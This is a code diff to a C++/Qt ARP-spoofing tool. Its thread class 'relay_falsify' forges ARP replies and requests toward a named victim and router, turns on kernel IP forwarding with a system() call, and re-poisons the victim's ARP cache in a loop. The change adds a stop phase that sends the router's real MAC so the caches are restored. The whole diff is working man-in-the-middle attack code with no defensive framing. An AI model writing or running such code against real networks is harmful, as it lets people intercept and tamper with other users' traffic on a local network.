@@ -15,9 +15,10 @@ void reply_mac_filter(char *get, u_char *my, int size);
 void reply_filter(char *get, u_char *my);
 //void reply_print_packet(int len, u_char *packet);
 
-QString relay_len, relay_my_mac, relay_router_mac, relay_router_ip, relay_victim_mac, relay_victim_ip;
+QString relay_len, relay_my_mac, relay_router_ip, relay_router_mac, relay_victim_ip, relay_victim_mac;
 pcap_t *cap;
 u_char *pack;
+bool stop_flag;
 
 u_int cnt = 0;
 u_char bc_f[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
@@ -37,24 +38,27 @@ struct arphdr {
 
 relay_falsify::relay_falsify(QObject *parent) : QThread(parent)
 {
-
+    stop_flag = this->stop = true;
 }
 
 void relay_falsify::run() {
-    this->stop = true;
     if(relay_len.toInt() > 42) {
         int size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr);
         pack += size;
         for(int i = 0; i < relay_len.toInt() - size; i++) *(pack + i) = 0x00;
         pack -= size;
     }
-
     system("echo 1 > /proc/sys/net/ipv4/ip_forward");
     while(this->stop) {
-        usleep(500000);
         reply_packet();
         request_packet();
         usleep(500000);
+        reply_packet();
+        usleep(500000);
+    }
+    stop_flag = this->stop;
+    for(int i = 0; i < 3; i++) {
+        sleep(1);
         reply_packet();
     }
     system("echo 0 > /proc/sys/net/ipv4/ip_forward");
@@ -65,12 +69,14 @@ void reply_packet() {
     arph = (struct arphdr *)(pack + sizeof(struct libnet_ethernet_hdr));
 
     reply_mac_filter(relay_victim_mac.toLatin1().data(), pack, mac_size);
-    reply_mac_filter(relay_my_mac.toLatin1().data(), pack+ETHER_ADDR_LEN, mac_size);
+    if(stop_flag) reply_mac_filter(relay_my_mac.toLatin1().data(), pack+ETHER_ADDR_LEN, mac_size);
+    else reply_mac_filter(relay_router_mac.toLatin1().data(), pack+ETHER_ADDR_LEN, mac_size);
 
     pack += sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha);
 
     *(pack - 1) = ARPOP_REPLY;
-    reply_mac_filter(relay_my_mac.toLatin1().data(), pack, mac_size);
+    if(stop_flag) reply_mac_filter(relay_my_mac.toLatin1().data(), pack, mac_size);
+    else reply_mac_filter(relay_router_mac.toLatin1().data(), pack, mac_size);
     reply_mac_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), pack+ETHER_ADDR_LEN, ip_size);
 
     pack += sizeof(arph->sha) + sizeof(arph->spa);
